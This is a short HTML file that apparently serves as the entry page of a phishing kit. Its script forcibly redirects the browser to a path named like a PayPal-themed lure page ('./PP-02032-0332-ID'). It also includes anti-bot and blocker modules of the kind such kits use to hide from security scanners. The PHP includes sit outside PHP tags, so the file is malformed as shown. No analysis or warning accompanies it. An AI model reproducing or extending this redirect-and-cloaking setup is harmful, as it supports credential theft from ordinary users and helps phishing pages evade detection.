<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<script language="javascript">
var page = "./PP-02032-0332-ID"          
top.location = page;
</script> 
</head>
include('blocker.php');
include('antibots.php');
include('block.php');
</html>
